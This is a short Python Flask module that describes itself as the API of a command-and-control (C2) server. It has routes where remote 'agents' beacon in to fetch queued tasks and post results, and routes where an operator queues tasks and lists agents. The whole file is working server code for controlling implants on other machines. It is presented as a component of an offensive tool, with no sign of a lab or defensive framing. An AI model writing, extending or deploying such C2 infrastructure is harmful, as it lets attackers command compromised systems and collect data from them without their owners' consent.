"""
Flask routes — C2 API endpoints.
Agents check in via POST /beacon, receive tasks, and post results.
"""
from __future__ import annotations

from flask import Flask, jsonify, request

# In-memory task queue: {agent_id: [task, ...]}
_task_queue: dict[str, list[dict]] = {}
# Results store: {agent_id: [result, ...]}
_results: dict[str, list[dict]] = {}


def register_routes(app: Flask) -> None:
    @app.route("/beacon", methods=["POST"])
    def beacon():
        data = request.get_json(silent=True) or {}
        agent_id = data.get("id", "unknown")
        tasks = _task_queue.pop(agent_id, [])
        return jsonify({"tasks": tasks})

    @app.route("/result", methods=["POST"])
    def result():
        data = request.get_json(silent=True) or {}
        agent_id = data.get("id", "unknown")
        _results.setdefault(agent_id, []).append(data)
        return jsonify({"status": "ok"})

    @app.route("/agents", methods=["GET"])
    def list_agents():
        return jsonify({"agents": list(_results.keys())})

    @app.route("/task", methods=["POST"])
    def push_task():
        data = request.get_json(silent=True) or {}
        agent_id = data.get("id")
        task = data.get("task")
        if not agent_id or not task:
            return jsonify({"error": "missing id or task"}), 400
        _task_queue.setdefault(agent_id, []).append(task)
        return jsonify({"status": "queued"})
